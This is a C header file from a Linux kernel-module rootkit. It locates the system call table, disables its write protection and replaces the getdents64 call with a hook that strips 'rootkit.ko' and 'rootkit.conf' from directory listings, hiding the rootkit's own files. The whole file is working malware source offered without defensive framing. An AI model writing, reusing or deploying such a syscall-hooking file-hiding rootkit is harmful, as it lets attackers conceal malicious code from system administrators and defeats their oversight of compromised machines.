#pragma once
#include "rk_lookup.h"
#include <linux/dirent.h>

unsigned long rk_sct_address;
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

int rk_file_hidden = 0;
asmlinkage int hook_getdents64(const struct pt_regs *regs) {
  int err;
  struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
  struct linux_dirent64 *dirent_ker, *cur = NULL, *prev = NULL;
  int res = orig_getdents64(regs), offset = 0;
  dirent_ker = kzalloc(res, GFP_KERNEL);
  if (res <= 0 || dirent_ker == NULL) return res;
  err = copy_from_user(dirent_ker, dirent, res);
  if (err) goto done;
  while (offset < res) {
    cur = (void *)dirent_ker + offset;
    if (memcmp("rootkit.ko", cur->d_name, 11) == 0 ||
        memcmp("rootkit.conf", cur->d_name, 13) == 0) {
      if (cur == dirent_ker) {
        res -= cur->d_reclen;
        memmove(cur, (void *)cur + cur->d_reclen, res);
      } else {
        prev->d_reclen += cur->d_reclen;
      }
    } else {
      prev = cur;
    }
    offset += cur->d_reclen;
  }
  err = copy_to_user(dirent, dirent_ker, res);
done:
  kfree(dirent_ker);
  return res;
}

int unprotect(unsigned long addr) {
  unsigned int level;
  pte_t *pte = lookup_address(addr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int protect(unsigned long addr) {
  unsigned int level;
  pte_t *pte = lookup_address(addr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

int rk_hide_file_init(void) {
  rk_sct_address = rk_lookup("sys_call_table");
  orig_getdents64 = ((void **)rk_sct_address)[__NR_getdents64];
  unprotect(rk_sct_address);
  ((void **)rk_sct_address)[__NR_getdents64] = hook_getdents64;
  protect(rk_sct_address);
  rk_file_hidden = true;
  return 0;
}

void rk_hide_file_exit(void) {
  unprotect(rk_sct_address);
  ((void **)rk_sct_address)[__NR_getdents64] = orig_getdents64;
  protect(rk_sct_address);
}